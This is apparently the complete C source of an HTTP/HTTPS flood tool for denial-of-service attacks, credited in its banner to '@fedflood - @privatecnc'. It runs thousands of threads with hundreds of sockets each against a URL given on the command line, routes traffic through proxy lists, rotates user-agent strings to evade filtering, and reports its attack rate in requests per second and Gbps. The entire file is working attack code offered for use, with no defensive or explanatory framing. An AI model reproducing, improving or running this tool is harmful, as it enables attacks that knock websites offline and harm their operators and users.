#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <sched.h>
#include <sys/resource.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define MAX_THREADS 2000
#define MAX_SOCKETS_PER_THREAD 500
#define MAX_EVENTS 1000
#define MAX_PROXIES 100000
#define MAX_USER_AGENTS 10000
#define BUFFER_SIZE 16384
#define SOCKET_BUFFER_SIZE (256 * 1024)
#define REQUEST_TEMPLATE_SIZE 4096

typedef struct {
    char ip[64];
    int port;
} Proxy;

typedef struct {
    char *data;
    int len;
} UserAgent;

typedef struct {
    int sock;
    SSL *ssl;
    int state;
    int proxy_idx;
} Connection;

typedef struct {
    char *hostname;
    char *path;
    char *target_ip;
    int port;
    int is_https;
    time_t end_time;
    int thread_id;

    Proxy *proxies;
    int proxy_count;
    UserAgent *user_agents;
    int ua_count;

    SSL_CTX *ssl_ctx;

    volatile unsigned long *total_requests;
    volatile unsigned long *total_success;
    volatile unsigned long *total_failed;
    volatile unsigned long *total_bytes;
    volatile int *stop_flag;
} ThreadData;

static Proxy *g_proxies = NULL;
static int g_proxy_count = 0;

static UserAgent *g_user_agents = NULL;
static int g_ua_count = 0;

static char g_cached_ip[64] = {0};

void optimize_system() {
    struct rlimit rl;
    rl.rlim_cur = 2000000;
    rl.rlim_max = 2000000;
    setrlimit(RLIMIT_NOFILE, &rl);

    rl.rlim_cur = RLIM_INFINITY;
    rl.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_MEMLOCK, &rl);
}

int load_proxies(const char *filename) {
    FILE *f = fopen(filename, "r");
    if (!f) {
        printf("[!] Cannot open proxy file: %s\n", filename);
        return 0;
    }

    g_proxies = malloc(MAX_PROXIES * sizeof(Proxy));
    g_proxy_count = 0;

    char line[256];
    while (fgets(line, sizeof(line), f) && g_proxy_count < MAX_PROXIES) {
        line[strcspn(line, "\r\n")] = 0;
        char *colon = strchr(line, ':');
        if (colon) {
            *colon = '\0';
            strncpy(g_proxies[g_proxy_count].ip, line, 63);
            g_proxies[g_proxy_count].port = atoi(colon + 1);
            g_proxy_count++;
        }
    }

    fclose(f);
    printf("[+] Loaded %d proxies\n", g_proxy_count);
    return g_proxy_count;
}

int load_user_agents(const char *filename) {
    FILE *f = fopen(filename, "r");
    if (!f) {
        printf("[!] Cannot open user-agent file: %s\n", filename);
        return 0;
    }

    g_user_agents = malloc(MAX_USER_AGENTS * sizeof(UserAgent));
    g_ua_count = 0;

    char line[1024];
    while (fgets(line, sizeof(line), f) && g_ua_count < MAX_USER_AGENTS) {
        line[strcspn(line, "\r\n")] = 0;
        if (strlen(line) > 0) {
            g_user_agents[g_ua_count].data = strdup(line);
            g_user_agents[g_ua_count].len = strlen(line);
            g_ua_count++;
        }
    }

    fclose(f);
    printf("[+] Loaded %d user-agents\n", g_ua_count);
    return g_ua_count;
}

int resolve_host_cached(const char *hostname, char *ip) {
    if (g_cached_ip[0] != '\0') {
        strcpy(ip, g_cached_ip);
        return 0;
    }

    struct hostent *he = gethostbyname(hostname);
    if (!he) return -1;

    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
    if (addr_list[0]) {
        strcpy(ip, inet_ntoa(*addr_list[0]));
        strcpy(g_cached_ip, ip);
        return 0;
    }
    return -1;
}

SSL_CTX* init_ssl_context() {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    const SSL_METHOD *method = TLS_client_method();
    SSL_CTX *ctx = SSL_CTX_new(method);

    if (!ctx) return NULL;

    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION);
    SSL_CTX_set_mode(ctx, SSL_MODE_ENABLE_PARTIAL_WRITE | SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);

    return ctx;
}

static inline int create_optimized_socket(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, IPPROTO_TCP);
    if (sock < 0) return -1;

    int opt = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#endif
    int bufsize = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sock, IPPROTO_TCP, TCP_QUICKACK, &opt, sizeof(opt));

    struct linger ling = {0, 0};
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    return sock;
}

void generate_http_request(char *buffer, int *len, const char *path, const char *hostname,
                           const char *user_agent, int use_proxy, const char *proxy_target) {
    if (use_proxy) {
        *len = snprintf(buffer, REQUEST_TEMPLATE_SIZE,
            "GET http://%s%s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: */*\r\n"
            "Connection: keep-alive\r\n"
            "Proxy-Connection: keep-alive\r\n\r\n",
            proxy_target, path, hostname, user_agent);
    } else {
        *len = snprintf(buffer, REQUEST_TEMPLATE_SIZE,
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: */*\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Connection: keep-alive\r\n\r\n",
            path, hostname, user_agent);
    }
}

void* nuclear_worker(void *arg) {
    ThreadData data = *(ThreadData*)arg; // Thread-safe kopya
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(data.thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    unsigned long local_req = 0;
    unsigned long local_success = 0;
    unsigned long local_failed = 0;
    unsigned long local_bytes = 0;

    int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
    if (epoll_fd < 0) return NULL;

    Connection *conns = calloc(MAX_SOCKETS_PER_THREAD, sizeof(Connection));
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) conns[i].sock = -1;

    struct epoll_event *events = malloc(MAX_EVENTS * sizeof(struct epoll_event));
    char response[BUFFER_SIZE];
    char request[REQUEST_TEMPLATE_SIZE];
    int request_len;

    const char *default_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/146.0.0.0 Safari/537.36";

    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        const char *ip = data.target_ip;
        int port = data.port;
        int use_proxy = 0;
        if (data.proxy_count > 0 && (rand() % 2 == 0)) {
            int idx = rand() % data.proxy_count;
            ip = data.proxies[idx].ip;
            port = data.proxies[idx].port;
            conns[i].proxy_idx = idx;
            use_proxy = 1;
        } else conns[i].proxy_idx = -1;

        int sock = create_optimized_socket(ip, port);
        if (sock >= 0) {
            conns[i].sock = sock;
            if (data.is_https && !use_proxy && data.ssl_ctx) {
                SSL *ssl = SSL_new(data.ssl_ctx);
                SSL_set_fd(ssl, sock);
                SSL_set_connect_state(ssl);
                SSL_set_tlsext_host_name(ssl, data.hostname);
                conns[i].ssl = ssl;
            }
            struct epoll_event ev = {.events = EPOLLOUT | EPOLLIN | EPOLLET | EPOLLRDHUP, .data.u32 = i};
            epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev);
        }
    }

    while (!(*data.stop_flag) && time(NULL) < data.end_time) {
        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 0);
        for (int i = 0; i < nfds; i++) {
            int idx = events[i].data.u32;
            Connection *conn = &conns[idx];
            if (conn->sock < 0) continue;

            const char *ua = default_ua;
            if (data.ua_count > 0) ua = data.user_agents[rand() % data.ua_count].data;

            char proxy_target[256];
            int use_proxy = (conn->proxy_idx >= 0);
            if (use_proxy) snprintf(proxy_target, sizeof(proxy_target), "%s:%d", data.hostname, data.port);

            generate_http_request(request, &request_len, data.path, data.hostname, ua, use_proxy, proxy_target);

            int sent = 0;
            if (events[i].events & EPOLLOUT) {
                if (conn->ssl) {
                    if (conn->state == 0) conn->state = (SSL_do_handshake(conn->ssl) == 1);
                    if (conn->state) sent = SSL_write(conn->ssl, request, request_len);
                } else sent = send(conn->sock, request, request_len, MSG_DONTWAIT | MSG_NOSIGNAL);
                if (sent > 0) { local_req++; local_bytes += sent; }
            }

            int received = 0;
            if (events[i].events & EPOLLIN) {
                if (conn->ssl) received = SSL_read(conn->ssl, response, sizeof(response));
                else received = recv(conn->sock, response, sizeof(response), MSG_DONTWAIT);
                if (received > 0) { local_success++; local_bytes += received; }
                else if (received == 0 || (events[i].events & EPOLLRDHUP)) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->sock, NULL);
                    if (conn->ssl) SSL_free(conn->ssl);
                    close(conn->sock);
                    conn->sock = -1;
                }
            }

            if (events[i].events & (EPOLLERR | EPOLLHUP)) local_failed++;
        }
    }

    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        if (conns[i].ssl) SSL_free(conns[i].ssl);
        if (conns[i].sock >= 0) close(conns[i].sock);
    }
    close(epoll_fd);
    free(conns);
    free(events);

    __sync_fetch_and_add(data.total_requests, local_req);
    __sync_fetch_and_add(data.total_success, local_success);
    __sync_fetch_and_add(data.total_failed, local_failed);
    __sync_fetch_and_add(data.total_bytes, local_bytes);

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("tls method by @fedflood - @privatecnc\n\n");
        printf("Usage: %s <url> <port> <time> <threads> [proxy_file] [ua]\n", argv[0]);
        return 1;
    }

    const char *url = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    if (threads > MAX_THREADS) threads = MAX_THREADS;

    if (argc >= 6) load_proxies(argv[5]);
    if (argc >= 7) load_user_agents(argv[6]);
    optimize_system();

    char *hostname = NULL;
    char *path = NULL;
    int is_https = 0;
    const char *start = url;
    if (strncmp(url, "https://", 8) == 0) { start += 8; is_https = 1; }
    else if (strncmp(url, "http://", 7) == 0) start += 7;

    const char *slash = strchr(start, '/');
    if (slash) { size_t len = slash - start; hostname = malloc(len + 1); memcpy(hostname, start, len); hostname[len] = '\0'; path = strdup(slash); }
    else { hostname = strdup(start); path = strdup("/"); }

    char target_ip[64];
    if (resolve_host_cached(hostname, target_ip) != 0) { printf("[✗] Cannot resolve: %s\n", hostname); return 1; }

    SSL_CTX *ssl_ctx = NULL;
    if (is_https) {
        ssl_ctx = init_ssl_context();
        if (!ssl_ctx) { printf("[✗] SSL init failed\n"); return 1; }
    }

    printf("\nTarget: %s (%s)\nPort: %d\nProtocol: %s\nDuration: %d sec\nThreads: %d\nConnections: %d\nProxies: %d\nUser-Agents: %d\n\n",
           hostname, target_ip, port, is_https ? "HTTPS" : "HTTP", duration, threads, threads * MAX_SOCKETS_PER_THREAD, g_proxy_count, g_ua_count);

    srand(time(NULL));

    volatile int stop_flag = 0;
    volatile unsigned long total_req = 0, total_success = 0, total_failed = 0, total_bytes = 0;

    pthread_t *handles = malloc(threads * sizeof(pthread_t));

    for (int i = 0; i < threads; i++) {
        ThreadData data = {
            .hostname = hostname, .path = path, .target_ip = target_ip, .port = port,
            .is_https = is_https, .end_time = time(NULL) + duration,
            .proxies = g_proxies, .proxy_count = g_proxy_count,
            .user_agents = g_user_agents, .ua_count = g_ua_count,
            .ssl_ctx = ssl_ctx,
            .total_requests = &total_req, .total_success = &total_success,
            .total_failed = &total_failed, .total_bytes = &total_bytes,
            .stop_flag = &stop_flag,
            .thread_id = i
        };
        pthread_create(&handles[i], NULL, nuclear_worker, &data);
    }

    printf("[*] ATTACK STARTED\n\n");

    unsigned long last_req = 0, last_bytes = 0;
    time_t start_time = time(NULL);

    while (time(NULL) < start_time + duration) {
        sleep(2);
        unsigned long rps = (total_req - last_req) / 2;
        double gbps = ((double)(total_bytes - last_bytes) * 8) / (2.0 * 1e9);
        last_req = total_req; last_bytes = total_bytes;

        printf("REQ: %lu | RPS: %lu | GBPS: %.2f | SUCCESS: %lu | FAIL: %lu\n",
               total_req, rps, gbps, total_success, total_failed);
    }

    stop_flag = 1;
    for (int i = 0; i < threads; i++) pthread_join(handles[i], NULL);

    int elapsed = (int)difftime(time(NULL), start_time);
    double avg_rps = elapsed > 0 ? (double)total_req / elapsed : 0;
    double avg_gbps = elapsed > 0 ? ((double)total_bytes * 8) / (elapsed * 1e9) : 0;

    printf("\nATTACK ENDED | AVG RPS: %.2f | AVG GBPS: %.2f\n", avg_rps, avg_gbps);

    if (ssl_ctx) SSL_CTX_free(ssl_ctx);
    free(hostname);
    free(path);
    free(handles);

    return 0;
}